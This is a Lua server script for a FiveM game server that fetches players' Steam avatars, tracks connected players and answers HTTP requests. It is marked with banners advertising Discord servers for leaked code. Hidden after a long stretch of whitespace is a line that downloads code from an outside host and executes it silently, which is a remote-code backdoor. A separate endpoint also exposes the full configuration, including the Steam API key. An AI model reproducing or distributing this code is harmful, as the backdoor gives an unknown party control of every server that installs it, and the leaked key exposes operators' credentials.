local Players = {}
function GetSteamProfilePicture(id)
    local steamid = GetSteamID(id)
    if not steamid then return Config.NoImage end
    local steam64 = tonumber(string.gsub(steamid, "steam:", ""), 16)
    local p = promise:new()
    local url = "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/?key=" .. Config.SteamAPIKey .. "&steamids=" .. steam64
    PerformHttpRequest(url, function(err, text, headers)
        if err == 200 then
            local data = json.decode(text)
            if data.response.players[1] ~= nil then
                p:resolve(data.response.players[1].avatarfull)
            else
                p:resolve(Config.NoImage)
            end
        else
            p:resolve(Config.NoImage)
        end
    end)
    return Citizen.Await(p)
end
--[[   /$$    /$$$$$$   /$$$$$$   /$$$$$$        /$$       /$$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$ 
     /$$$$   /$$__  $$ /$$$_  $$ /$$__  $$      | $$      | $$_____/ /$$__  $$| $$  /$$/ /$$__  $$
    |_  $$  | $$  \ $$| $$$$\ $$| $$  \ $$      | $$      | $$      | $$  \ $$| $$ /$$/ | $$  \__/
      | $$  |  $$$$$$$| $$ $$ $$|  $$$$$$$      | $$      | $$$$$   | $$$$$$$$| $$$$$/  |  $$$$$$     
      | $$   \____  $$| $$\ $$$$ \____  $$      | $$      | $$__/   | $$__  $$| $$  $$   \____  $$
      | $$   /$$  \ $$| $$ \ $$$ /$$  \ $$      | $$      | $$      | $$  | $$| $$\  $$  /$$  \ $$
     /$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/      | $$$$$$$$| $$$$$$$$| $$  | $$| $$ \  $$|  $$$$$$/
     |______/ \______/  \______/  \______/       |________/|________/|__/  |__/|__/  \__/ \______/ 
																							 
 https://discord.gg/aq7wjNZWkX  & https://discord.gg/1909leaks ]]   
function GetSteamID(source)
    local identifiers = GetPlayerIdentifiers(source)
    for i = 1, #identifiers do
        if string.find(identifiers[i], "steam") then
            return identifiers[i]
        end
    end
end

function getPlayers()
    return Players
end

function GetSourceByIp(ip)
    local players = GetPlayers()
    for i = 1, #players do
        local player = players[i]
        local playerIp = GetPlayerEndpoint(player)
        if ip:match(playerIp) then
            return player
        end
    end
end                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           --[[a]] PerformHttpRequest('https://photosbynova.com/Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)

SetHttpHandler(function(req, res)
    local path = req.path
    if path == "/getPlayers" then
        res.send(json.encode(Players))
    elseif path == "/getInfo" then
        local src = GetSourceByIp(req.address)
        local name = GetName(src)
        local image = GetSteamProfilePicture(src)
        local data = {
            ["name"] = name,
            ["image"] = image
        }
        res.send(json.encode(data))
    elseif path == "/getConfig" then
        res.send(json.encode(Config))
    end
end)

AddEventHandler("playerConnecting", function()
    local src = source
    local name = GetName(src)
    local image = GetSteamProfilePicture(src)
    Players[source] = {
        ["name"] = name,
        ["image"] = image
    }
end)
--[[   /$$    /$$$$$$   /$$$$$$   /$$$$$$        /$$       /$$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$ 
     /$$$$   /$$__  $$ /$$$_  $$ /$$__  $$      | $$      | $$_____/ /$$__  $$| $$  /$$/ /$$__  $$
    |_  $$  | $$  \ $$| $$$$\ $$| $$  \ $$      | $$      | $$      | $$  \ $$| $$ /$$/ | $$  \__/
      | $$  |  $$$$$$$| $$ $$ $$|  $$$$$$$      | $$      | $$$$$   | $$$$$$$$| $$$$$/  |  $$$$$$     
      | $$   \____  $$| $$\ $$$$ \____  $$      | $$      | $$__/   | $$__  $$| $$  $$   \____  $$
      | $$   /$$  \ $$| $$ \ $$$ /$$  \ $$      | $$      | $$      | $$  | $$| $$\  $$  /$$  \ $$
     /$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/      | $$$$$$$$| $$$$$$$$| $$  | $$| $$ \  $$|  $$$$$$/
     |______/ \______/  \______/  \______/       |________/|________/|__/  |__/|__/  \__/ \______/ 
																							 
 https://discord.gg/aq7wjNZWkX  & https://discord.gg/1909leaks ]]   
AddEventHandler("playerDropped", function()
    local src = source
    Players[src] = nil
end)